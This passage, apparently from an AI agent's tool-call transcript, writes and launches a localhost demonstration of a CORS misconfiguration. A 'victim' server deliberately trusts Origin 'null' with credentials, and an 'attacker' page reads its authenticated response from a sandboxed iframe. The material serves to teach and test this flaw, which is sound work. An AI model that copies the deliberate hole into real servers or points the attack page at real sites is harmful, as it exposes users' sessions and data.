import http.server
import socketserver

PORT = 8000

class Handler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-Type', 'text/html')
        # VULNERABLE CORS HEADER
        self.send_header('Access-Control-Allow-Origin', 'null')
        self.send_header('Access-Control-Allow-Credentials', 'true')
        self.end_headers()
        self.wfile.write(b'''
        <html>
        <body>
          <h1>Victim Server</h1>
          <p>This server trusts Origin: null</p>
          <p>Cookie set: <code>session=abc123</code></p>
          <script>
            // Set a fake cookie for demo
            document.cookie = "session=abc123; SameSite=None; Secure";
            // Load attacker iframe
            const iframe = document.createElement('iframe');
            iframe.sandbox = 'allow-scripts';
            iframe.src = 'http://localhost:8001/attacker.html';
            document.body.appendChild(iframe);
          </script>
        </body>
        </html>
        ''')

if __name__ == "__main__":
    with socketserver.TCPServer(("", PORT), Handler) as httpd:
        print(f"Victim server running at http://localhost:{PORT}")
        httpd.serve_forever()`

TOOL: file_write
INPUT: attacker_server.py|||import http.server
import socketserver

PORT = 8001

class Handler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-Type', 'text/html')
        self.end_headers()
        self.wfile.write(b'''
        <html>
        <body>
          <h1>Attacker Page</h1>
          <p>Trying to steal cookies via null origin...</p>
          <script>
            // This runs with Origin: null when loaded in a sandboxed iframe
            fetch('http://localhost:8000/', { credentials: 'include' })
              .then(r => r.text())
              .then(text => {
                console.log('✅ SUCCESS: Stole response from victim!');
                console.log('Response snippet:', text.slice(0, 200));
                alert('Cookie was sent! Check browser console.');
              })
              .catch(e => {
                console.error('❌ FAILED:', e.message);
                alert('Request blocked. CORS may be fixed.');
              });
          </script>
        </body>
        </html>
        ''')

if __name__ == "__main__":
    with socketserver.TCPServer(("", PORT), Handler) as httpd:
        print(f"Attacker server running at http://localhost:{PORT}")
        httpd.serve_forever()`

TOOL: run_code
INPUT: |
import os
os.system('python3 victim_server.py &')
import time
time.sleep(1)
os.system('python3 attacker_server.py')